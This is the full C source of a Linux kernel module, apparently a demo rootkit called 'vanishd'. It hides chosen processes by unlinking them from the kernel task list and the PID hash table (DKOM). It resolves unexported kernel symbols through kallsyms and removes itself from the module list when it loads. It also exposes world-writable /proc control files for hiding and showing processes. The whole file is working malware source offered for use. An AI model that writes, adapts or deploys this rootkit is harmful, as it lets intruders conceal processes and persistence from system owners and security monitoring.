#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h> 
#include <linux/string.h>
#include <linux/hashtable.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/list.h>


//#include "ftrace_helper.h"

#include "vanishd.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Logan Chamberlain"); 
MODULE_DESCRIPTION("A demo rootkit that hides processes using DKOM");

// accepts one command line arg
static bool QUIET = false; 
module_param(QUIET, bool, 0); 
MODULE_PARM_DESC(QUIET, "Enable or disable logging to dmesg"); 


// define the hashmap that tracks hidden processes 
static DEFINE_HASHTABLE(hidden, 3);
static DEFINE_MUTEX(hidden_mutex); 


static struct proc_dir_entry *proc_file_process;
static struct proc_dir_entry *proc_file_module; 
static char usage_string[BUF_SIZE] = "vanishd rootkit loaded. Usage:\necho '[show|hide] <pid>' > /proc/process\necho '[show|hide]' > /proc/module\n";
static char kernel_buf[BUF_SIZE]; 
static unsigned long data_size = 109; // default length to read from /proc/process or /proc/module




static struct vanishd_hidden *hidden_lookup_by_pid(int target_pid)
{
    // looks up an entry in the hidden hashmap by task_struct pointer 
    struct vanishd_hidden *h;
	mutex_lock(&hidden_mutex); 
    hash_for_each_possible(hidden, h, node, (unsigned long)target_pid) {
        if (h->pid == target_pid) {
			mutex_unlock(&hidden_mutex);
			return h;
		}
    }
	mutex_unlock(&hidden_mutex); 
    return NULL;
}




typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
kallsyms_lookup_name_t kallsyms_lookup_name_ptr = NULL;
rwlock_t *tasklist_lock_ptr = NULL; 

typedef void (*detach_pid_t)(struct task_struct *task, enum pid_type type);
typedef void (*attach_pid_t)(struct task_struct *task, enum pid_type type);

// attach|deattach_pid aren't exported, use ftrace helper to look them up 
detach_pid_t detach_pid_ptr = NULL;
attach_pid_t attach_pid_ptr = NULL;


static struct pid **task_pid_ptr(struct task_struct *task, enum pid_type type)
{
	return (type == PIDTYPE_PID) ?
		&task->thread_pid :
		&task->signal->pids[type];
}


int module_hidden = 0; 
static struct list_head *prev_module; 

static void hide_module(void) 
{
	if (!module_hidden) {
		prev_module = THIS_MODULE->list.prev;
		list_del(&THIS_MODULE->list); 
		module_hidden = 1; 
		if (!QUIET)
			pr_info("vanishd: module hidden\n");
	}
}

static void unhide_module(void) 
{
	if (module_hidden) {
		list_add(&THIS_MODULE->list, prev_module);
		module_hidden = 0; 
		if (!QUIET)
			pr_info("vanishd: module unhidden\n"); 
	}
}
 
static int hide_process(int target_pid) 
{
	if (!QUIET)
		pr_info("vanishd: hiding pid: %d\n", target_pid);
	// allocate a struct to track the newly hidden process
	struct vanishd_hidden *h = kzalloc(sizeof(*h), GFP_KERNEL); 
	if (!h) {
		if (!QUIET)
			pr_err("vanishd: failed to allocate memory!\n"); 
		return -ENOMEM; 
	} 
	h->pinned_pid = find_get_pid(target_pid); // increment ref count 
	if (!h->pinned_pid) {
		if (!QUIET)
			pr_err("vanishd: target pid not found\n"); 
		kfree(h); 
		return -EINVAL; 
	}
	rcu_read_lock();
	h->task = pid_task(h->pinned_pid, PIDTYPE_PID); 
	if (h->task) {
		if (!QUIET)
			pr_info("vanishd: target comm -> %s\n", h->task->comm); 
	} else {
		if (!QUIET) 
			pr_err("vanishd: failed to resolve task* from pid\n"); 
		rcu_read_unlock(); 
		kfree(h); 
		return -EINVAL; 
	}
	rcu_read_unlock(); 
	
	// populate fields 
	h->pid = h->task->pid;  
	h->prev_task = h->task->tasks.prev; 
	
	// add to hidden hashtable 
	mutex_lock(&hidden_mutex); 
	hash_add(hidden, &h->node, h->pid); // indexed by pid for now 
	mutex_unlock(&hidden_mutex);  
	
	// remove from global tasks* list
	write_lock_irq(tasklist_lock_ptr); 
	// save previous task to add it later 
	// unlink from global tasks*
	list_del(&h->task->tasks); 
	write_unlock_irq(tasklist_lock_ptr); 
	if(!QUIET)
		pr_info("vanishd: unlinked from tasks list\n"); 
	// remove from pid hash table 
	write_lock_irq(tasklist_lock_ptr); 
	detach_pid_ptr(h->task, PIDTYPE_PID); 
	detach_pid_ptr(h->task, PIDTYPE_TGID); 
	write_unlock_irq(tasklist_lock_ptr); 
	if (!QUIET)
		pr_info("vanishd: removed from pid hash table\n"); 
	return 0; 
}

static void unhide_process(struct vanishd_hidden *h) 
{
	if (!QUIET)
	pr_info("vanishd: unhiding pid: %d\n", h->pid);
	if (h->pinned_pid == NULL || h->task == NULL ) {
		if (!QUIET)
			pr_err("vanishd: cannot unhide if nothing is hidden!\n"); 
		return; 
	} else if (pid_vnr(h->pinned_pid) != h->pid) {
		if (!QUIET) 
			pr_err("vanishd: namespace mismatch\n"); 
		return; 
	}
	
	// add back to global tasks* list 
	write_lock_irq(tasklist_lock_ptr); 
	list_add(&h->task->tasks, h->prev_task); 
	write_unlock_irq(tasklist_lock_ptr); 
	if (!QUIET)
		pr_info("vanishd: inserted back into tasks list\n"); 
	// add to pid hash table again 
	write_lock_irq(tasklist_lock_ptr); 
	*task_pid_ptr(h->task, PIDTYPE_PID) = h->pinned_pid; 
	attach_pid_ptr(h->task, PIDTYPE_PID); 
	*task_pid_ptr(h->task, PIDTYPE_TGID) = h->pinned_pid; 
	attach_pid_ptr(h->task, PIDTYPE_TGID); 
	write_unlock_irq(tasklist_lock_ptr); 
	if (!QUIET)
		pr_info("vanishd: inserted back into pid hash table\n"); 

	mutex_lock(&hidden_mutex); 
	put_pid(h->pinned_pid); // decrement the ref count 
	hash_del(&h->node); // remove from hashtable
	put_task_struct(h->task);  
	kfree(h);
	mutex_unlock(&hidden_mutex);  
}


// called when procfs entry is read: cat /proc/process or cat /proc/module 
static ssize_t proc_read(struct file *file, char __user *user_buf, size_t count, loff_t *ppos) {
	if (*ppos >= data_size) {
		return 0; // cursor is past the string
	}
	if (count > data_size - *ppos) {
		count = data_size - *ppos; 
	}
	// copy the usage string to user space 
	if (copy_to_user(user_buf, usage_string + *ppos, count)) {
		return -EFAULT; 
	}
	// advance the cursor
	*ppos += count; 
	return count; 
}

// called when procfs entry is written to: echo '[hide | show] <pid>' > /proc/process 
static ssize_t proc_write_process(struct file *file, const char __user *user_buf, size_t count, loff_t *ppos) 
{
	// no way I'm writing a buffer overflow in 2026 
	if (count >= BUF_SIZE) {
		data_size = BUF_SIZE - 1; 
	} else {
		data_size = count; 
	}
	if(copy_from_user(kernel_buf, user_buf, data_size)) {
		return -EFAULT; 
	}
	kernel_buf[data_size] = '\0'; 
	int target_pid; 
	if (strncmp(kernel_buf, "show", 4) == 0) {
		if (sscanf(kernel_buf, "show %d", &target_pid) == 1) {
			struct vanishd_hidden *h = hidden_lookup_by_pid(target_pid); 
			if (h)
				unhide_process(h); 
		}
	} else if (strncmp(kernel_buf, "hide", 4) == 0) {
		if (sscanf(kernel_buf, "hide %d", &target_pid) == 1) {
			int ret = hide_process(target_pid); 
			if (!ret) {
				if (!QUIET)
					pr_err("vanishd: failed to hide process: %d\n", ret); 
			}
		}
	}
	return count; 
}


// called when procfs entry is written to: echo '[hide | show]' > /proc/module 
static ssize_t proc_write_module(struct file *file, const char __user *user_buf, size_t count, loff_t *ppos) 
{
	// no way I'm writing a buffer overflow in 2026 
	if (count >= BUF_SIZE) {
		data_size = BUF_SIZE - 1; 
	} else {
		data_size = count; 
	}
	if(copy_from_user(kernel_buf, user_buf, data_size)) {
		return -EFAULT; 
	}
	kernel_buf[data_size] = '\0'; 
	
	if (strncmp(kernel_buf, "show", 4) == 0) {
		unhide_module(); 
	} else if (strncmp(kernel_buf, "hide", 4) == 0) {
		hide_module(); 
	}
	return count; 
}



// both the read ops do the same thing: print the usage string. 
static const struct proc_ops proc_file_ops_process = {
	.proc_read = proc_read, 
	.proc_write = proc_write_process,
}; 

static const struct proc_ops proc_file_ops_module = {
	.proc_read = proc_read, 
	.proc_write = proc_write_module,
}; 



static int create_procfs_entries(void) 
{
	proc_file_process = proc_create(PROC_PROCESS, 0666, NULL, &proc_file_ops_process); 
	if (!proc_file_process) {
		return -ENOMEM; 
	}
	if (!QUIET)
		pr_info("vanishd: created /proc/%s\n", PROC_PROCESS); 
	proc_file_module = proc_create(PROC_MODULE, 0666, NULL, &proc_file_ops_module); 
	if (!proc_file_module) {
		return -ENOMEM; 
	}
	if (!QUIET)
		pr_info("vanishd: created /proc/%s\n", PROC_MODULE); 
	return 0; 
}



static void cleanup(void) 
{
	// unhide any remaining hidden processes upon exit 
	struct vanishd_hidden *h;
	int bucket; 
	mutex_lock(&hidden_mutex); 
	hash_for_each(hidden, bucket, h, node) {
		unhide_process(h); 
	}
	mutex_unlock(&hidden_mutex); 
	if (!QUIET)
		pr_info("vanishd: all remaining processes unhidden\n"); 
	proc_remove(proc_file_process); 
	if (!QUIET)
		pr_info("vanishd: /proc/%s removed\n", PROC_PROCESS); 
	proc_remove(proc_file_module);
	if (!QUIET) 
		pr_info("vanishd: /proc/%s removed\n", PROC_MODULE);
}


static int vanishd_init(void) 
{
	int res = create_procfs_entries(); 
	if ( res != 0 ) {
		if (!QUIET)
			pr_info("vanishd: error creating procfs entry.\n"); 
		return res; 
	}
	kallsyms_lookup_name_ptr = (void*)lookup_name("kallsyms_lookup_name"); 
	if(!kallsyms_lookup_name_ptr) {
		if (!QUIET)
			pr_err("vanishd: failed to lookup kallsyms_lookup_name\n"); 
		return -1; 
	}

	tasklist_lock_ptr = (rwlock_t *)kallsyms_lookup_name_ptr("tasklist_lock"); 
	if (!tasklist_lock_ptr) {
		if (!QUIET)
			pr_err("vanishd: failed to lookup tasklist_lock\n"); 
		return -1; 
	}

	detach_pid_ptr = (detach_pid_t)kallsyms_lookup_name_ptr("detach_pid"); 
	if(!detach_pid_ptr) {
		if (!QUIET)
			pr_err("vanishd: failed to lookup detach_pid\n"); 
		return -1;
	}

	attach_pid_ptr = (attach_pid_t)kallsyms_lookup_name_ptr("attach_pid"); 
	if(!attach_pid_ptr) {
		if (!QUIET)
			pr_err("vanishd: failed to lookup attach_pid\n"); 
		return -1; 
	}

	hide_module(); 
	return 0;
}


static void vanishd_exit(void) 
{
	cleanup();
	if (!QUIET)
		pr_info("vanishd: cleanup complete, unloading..\n"); 
}




module_init(vanishd_init);
module_exit(vanishd_exit);
